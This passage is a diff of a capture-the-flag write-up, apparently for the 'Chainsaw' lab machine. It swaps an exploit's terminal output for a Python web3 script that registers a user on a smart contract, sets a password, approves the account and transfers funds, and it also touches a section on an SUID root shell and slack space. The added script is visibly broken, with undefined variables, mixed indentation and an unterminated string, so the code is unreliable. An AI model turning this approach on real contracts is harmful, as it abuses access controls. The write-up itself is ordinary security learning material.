@@ -580,26 +580,41 @@ To make our exploit work we need to meet certain conditions:
 + Approve our user 
 + Transfer enough  funds to join  the club 
 
+Full Exploit:
 ```python
 
-➜  chainsaw python3 prives.py 0x5e83B952523Ec2551bbA99EC79791dBd7bd93621 d3 dog@1
-[+] Starting
-[+] Connecting to localhost:63991
-[*] Connection Established
-[+] Creating the contract representation
-[+] Address: 0x5e83B952523Ec2551bbA99EC79791dBd7bd93621
-[*] Done
-[+] Calling setUsername() with: d3
-[*] Done. getUsername(): d3
-[+] Calling setPassword() with: 091422dcd317eb871d4f5dca91cda85a (dog@1)
-[*] Done. getPassword(): 091422dcd317eb871d4f5dca91cda85a
-[+] Calling setApprove() with: True
-[*] Done. getApprove(): True
-[+] Calling transfer() with: 1000
-[*] Done. getBalance(): 1000
-[+] Exploit finished. Now you can login with the provided credentials: d3:dog@1, Exiting...
-➜  chainsaw 
+from web3 import Web3, eth
+from sys import argv
+from hashlib import md5
+import json
+
+
+def exploit(address,password):
+    username = 'd3'
+    password = md5(password.encode('utf-8')).hexdigest()
+    w3 = Web3(Web3.HTTPProvider('http://localhost:63991'))
+    w3.eth.defaultAccount = w3.eth.accounts[0]
+    abi = json.loads(open('/home/bobby/projects/ChainsawClub/ChainsawClub.json').read())
+    contract = w3.eth.contract(address=address, abi=abi)
+        #Add a new account 
+    contract.functions.setUsername(username).transact()
+	contract.functions.setPassword(paspassword).transact()
+    print("[*] Added user: {}".format(username))
+    print("[*] Password (MD5): {}".format(password))
+    #Approve the user and confirm
+    contract.functions.setApprove(True).transact()
+    contract.functions.transfer(1000).transact()
+    status = contractInstance.functions.getApprove().call()
+    print("[*] Approval status: {}".format(status))
+    #Transfer 1000 funds
+   	contract.functions.transfer(1000).transact()
+    balance = contractInstance.functions.getBalance().call()
+    print("[*] Total balance: {}".format(balance))
+    print("[+] Exploiting Done..)
+	exit()
+
 ```
+The exploit add a username 'd3' and set password as dog@1, now we can login with that credentials to chainsawclub.
 
 ##### Root Shell
 
@@ -638,7 +653,7 @@ slack size: 4044
 block size: 4096
 68c874b7d*******
 
-There is another way we can exploit this SUID binary, but i will leave it  from here.
+There is another way we can exploit this SUID binary, but i am totally exausted after battling with this one for past few days.
 
 #### Concluion
 This was a great box, i learned a lot about smartcontacts,blockchain,IPFS and slack spacing.
